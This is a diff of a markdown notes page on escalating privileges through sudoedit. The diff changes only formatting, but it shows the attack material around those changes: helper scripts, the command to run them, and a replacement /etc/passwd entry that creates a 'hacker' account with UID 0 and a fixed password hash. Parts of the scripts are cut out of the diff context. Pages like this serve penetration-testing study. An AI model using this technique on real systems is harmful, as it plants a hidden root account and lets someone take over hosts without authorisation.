@@ -1,3 +1,7 @@
+---
+description: (unsure which version of sudo was vulnerable, to be added)
+---
+
 # sudoedit
 
 Based on the following existing solutions:
@@ -6,7 +10,7 @@ Based on the following existing solutions:
 * [https://shadow-file.blogspot.com/2009/01/how-to-sudoedit-non-interactively.html](https://shadow-file.blogspot.com/2009/01/how-to-sudoedit-non-interactively.html)
 
 {% code title="editor.sh" %}
-```text
+```
 #!/bin/sh
 CAT=/bin/cat
 PRE_STAGE="./stage.tmp"
@@ -16,15 +20,15 @@ exit;
 ```
 {% endcode %}
 
-{% code title="stage.tmp \(this is the new /etc/passwd file\)" %}
-```text
+{% code title="stage.tmp (this is the new /etc/passwd file)" %}
+```
 [...]
 hacker:$1$pwn$sX7TFgG1yRswJLX53dwzy1:0:0:root:/root:/bin/bash
 ```
 {% endcode %}
 
 {% code title="sudoedit-passwd.sh" %}
-```text
+```
 #!/bin/sh
 OLD_EDITOR=$EDITOR;
 
@@ -39,7 +43,6 @@ exit;
 ```
 {% endcode %}
 
-```text
+```
 bash sudoedit-passwd.sh
 ```
-
